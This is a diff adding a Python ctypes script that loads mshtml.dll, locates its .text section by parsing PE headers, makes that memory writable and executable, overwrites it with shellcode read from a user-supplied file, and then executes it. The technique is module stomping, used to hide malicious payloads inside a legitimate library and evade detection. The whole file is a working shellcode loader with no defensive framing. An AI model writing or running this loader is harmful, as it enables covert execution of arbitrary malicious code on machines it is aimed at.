@@ -1,0 +1,202 @@
+import sys
+import ctypes
+from ctypes import wintypes
+
+# --- 64-bit PE Structure Definitions ---
+
+class IMAGE_DOS_HEADER(ctypes.Structure):
+    _fields_ = [
+        ('e_magic', wintypes.WORD),
+        ('e_cblp', wintypes.WORD),
+        ('e_cp', wintypes.WORD),
+        ('e_crlc', wintypes.WORD),
+        ('e_cparhdr', wintypes.WORD),
+        ('e_minalloc', wintypes.WORD),
+        ('e_maxalloc', wintypes.WORD),
+        ('e_ss', wintypes.WORD),
+        ('e_sp', wintypes.WORD),
+        ('e_csum', wintypes.WORD),
+        ('e_ip', wintypes.WORD),
+        ('e_cs', wintypes.WORD),
+        ('e_lfarlc', wintypes.WORD),
+        ('e_ovno', wintypes.WORD),
+        ('e_res', wintypes.WORD * 4),
+        ('e_oemid', wintypes.WORD),
+        ('e_oeminfo', wintypes.WORD),
+        ('e_res2', wintypes.WORD * 10),
+        ('e_lfanew', wintypes.LONG),
+    ]
+
+class IMAGE_FILE_HEADER(ctypes.Structure):
+    _fields_ = [
+        ('Machine', wintypes.WORD),
+        ('NumberOfSections', wintypes.WORD),
+        ('TimeDateStamp', wintypes.DWORD),
+        ('PointerToSymbolTable', wintypes.DWORD),
+        ('NumberOfSymbols', wintypes.DWORD),
+        ('SizeOfOptionalHeader', wintypes.WORD),
+        ('Characteristics', wintypes.WORD),
+    ]
+
+class IMAGE_DATA_DIRECTORY(ctypes.Structure):
+    _fields_ = [
+        ('VirtualAddress', wintypes.DWORD),
+        ('Size', wintypes.DWORD),
+    ]
+
+class IMAGE_OPTIONAL_HEADER64(ctypes.Structure):
+    _fields_ = [
+        ('Magic', wintypes.WORD),
+        ('MajorLinkerVersion', ctypes.c_ubyte),
+        ('MinorLinkerVersion', ctypes.c_ubyte),
+        ('SizeOfCode', wintypes.DWORD),
+        ('SizeOfInitializedData', wintypes.DWORD),
+        ('SizeOfUninitializedData', wintypes.DWORD),
+        ('AddressOfEntryPoint', wintypes.DWORD),
+        ('BaseOfCode', wintypes.DWORD),
+        ('ImageBase', ctypes.c_uint64),
+        ('SectionAlignment', wintypes.DWORD),
+        ('FileAlignment', wintypes.DWORD),
+        ('MajorOperatingSystemVersion', wintypes.WORD),
+        ('MinorOperatingSystemVersion', wintypes.WORD),
+        ('MajorImageVersion', wintypes.WORD),
+        ('MinorImageVersion', wintypes.WORD),
+        ('MajorSubsystemVersion', wintypes.WORD),
+        ('MinorSubsystemVersion', wintypes.WORD),
+        ('Win32VersionValue', wintypes.DWORD),
+        ('SizeOfImage', wintypes.DWORD),
+        ('SizeOfHeaders', wintypes.DWORD),
+        ('CheckSum', wintypes.DWORD),
+        ('Subsystem', wintypes.WORD),
+        ('DllCharacteristics', wintypes.WORD),
+        ('SizeOfStackReserve', ctypes.c_uint64),
+        ('SizeOfStackCommit', ctypes.c_uint64),
+        ('SizeOfHeapReserve', ctypes.c_uint64),
+        ('SizeOfHeapCommit', ctypes.c_uint64),
+        ('LoaderFlags', wintypes.DWORD),
+        ('NumberOfRvaAndSizes', wintypes.DWORD),
+        ('DataDirectory', IMAGE_DATA_DIRECTORY * 16),
+    ]
+
+class IMAGE_NT_HEADERS64(ctypes.Structure):
+    _fields_ = [
+        ('Signature', wintypes.DWORD),
+        ('FileHeader', IMAGE_FILE_HEADER),
+        ('OptionalHeader', IMAGE_OPTIONAL_HEADER64),
+    ]
+
+class IMAGE_SECTION_HEADER(ctypes.Structure):
+    _fields_ = [
+        ('Name', ctypes.c_char * 8),
+        ('Misc_VirtualSize', wintypes.DWORD),
+        ('VirtualAddress', wintypes.DWORD),
+        ('SizeOfRawData', wintypes.DWORD),
+        ('PointerToRawData', wintypes.DWORD),
+        ('PointerToRelocations', wintypes.DWORD),
+        ('PointerToLinenumbers', wintypes.DWORD),
+        ('NumberOfRelocations', wintypes.WORD),
+        ('NumberOfLinenumbers', wintypes.WORD),
+        ('Characteristics', wintypes.DWORD),
+    ]
+
+# --- Windows API Definitions with 64-bit argtypes/restype ---
+
+# Extend wintypes for 64-bit compatibility to prevent AttributeError
+wintypes.ULONGLONG = ctypes.c_ulonglong
+wintypes.SIZE_T = ctypes.c_size_t
+wintypes.LPDWORD = ctypes.POINTER(wintypes.DWORD)
+
+kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
+
+LoadLibraryW = kernel32.LoadLibraryW
+LoadLibraryW.argtypes = [wintypes.LPCWSTR]
+LoadLibraryW.restype = wintypes.HMODULE
+
+VirtualProtect = kernel32.VirtualProtect
+VirtualProtect.argtypes = [wintypes.LPVOID, wintypes.SIZE_T, wintypes.DWORD, wintypes.LPDWORD]
+VirtualProtect.restype = wintypes.BOOL
+
+# Constants
+PAGE_EXECUTE_READ = 0x20
+PAGE_EXECUTE_READWRITE = 0x40
+
+def main():
+    if len(sys.argv) < 2:
+        print(f"Usage: {sys.argv[0]} <path_to_shellcode_bin>")
+        sys.exit(1)
+
+    try:
+        with open(sys.argv[1], 'rb') as f:
+            payload = f.read()
+    except FileNotFoundError:
+        print(f"Error: File not found at '{sys.argv[1]}'")
+        sys.exit(1)
+
+    # 1. Load a legitimate DLL
+    # Using mshtml.dll because it's large and commonly present.
+    dll_name = "mshtml.dll"
+    h_module = LoadLibraryW(dll_name)
+    if not h_module:
+        print(f"Error loading {dll_name}: {ctypes.get_last_error()}")
+        sys.exit(1)
+
+    # Cast module handle to a void pointer for arithmetic
+    base_address = ctypes.c_void_p(h_module)
+
+    # 2. Parse PE headers to find the .text section
+    dos_header = ctypes.cast(base_address, ctypes.POINTER(IMAGE_DOS_HEADER)).contents
+    nt_headers_ptr = ctypes.c_void_p(base_address.value + dos_header.e_lfanew)
+    nt_headers = ctypes.cast(nt_headers_ptr, ctypes.POINTER(IMAGE_NT_HEADERS64)).contents
+
+    # Find the first section header
+    section_header_ptr = ctypes.c_void_p(nt_headers_ptr.value + ctypes.sizeof(IMAGE_NT_HEADERS64))
+
+    text_section = None
+    for i in range(nt_headers.FileHeader.NumberOfSections):
+        section = ctypes.cast(ctypes.c_void_p(section_header_ptr.value + i * ctypes.sizeof(IMAGE_SECTION_HEADER)), ctypes.POINTER(IMAGE_SECTION_HEADER)).contents
+        # Check for '.text' section
+        if section.Name.startswith(b'.text'):
+            text_section = section
+            break
+
+    if not text_section:
+        print("Error: Could not find the .text section in the loaded module.")
+        sys.exit(1)
+
+    if len(payload) > text_section.SizeOfRawData:
+        print(f"Error: Shellcode (size: {len(payload)}) is larger than the target .text section (size: {text_section.SizeOfRawData}).")
+        sys.exit(1)
+        
+    # Calculate the absolute address of the .text section
+    text_section_addr = ctypes.c_void_p(base_address.value + text_section.VirtualAddress)
+
+    # 3. Change memory permissions to RWX
+    old_protect = wintypes.DWORD(0)
+    if not VirtualProtect(text_section_addr, text_section.SizeOfRawData, PAGE_EXECUTE_READWRITE, ctypes.byref(old_protect)):
+        print(f"Error changing memory to RWX: {ctypes.get_last_error()}")
+        sys.exit(1)
+
+    # 4. Copy shellcode into the .text section
+    # Create a buffer from the Python bytes object
+    payload_buffer = (ctypes.c_ubyte * len(payload)).from_buffer_copy(payload)
+    ctypes.memmove(text_section_addr, payload_buffer, len(payload))
+
+    # 5. Restore original memory permissions (RX)
+    if not VirtualProtect(text_section_addr, text_section.SizeOfRawData, PAGE_EXECUTE_READ, ctypes.byref(old_protect)):
+        print(f"Error restoring memory to RX: {ctypes.get_last_error()}")
+        sys.exit(1)
+        
+    # 6. Execute the shellcode
+    # Create a function prototype for the shellcode
+    shellcode_func_type = ctypes.CFUNCTYPE(None)
+    # Cast the address of our shellcode to the function type
+    shellcode_func = shellcode_func_type(text_section_addr.value)
+    
+    print("Executing shellcode from within mshtml.dll's .text section...")
+    shellcode_func()
+    print("Shellcode execution finished.")
+
+    return 0
+
+if __name__ == "__main__":
+    main()
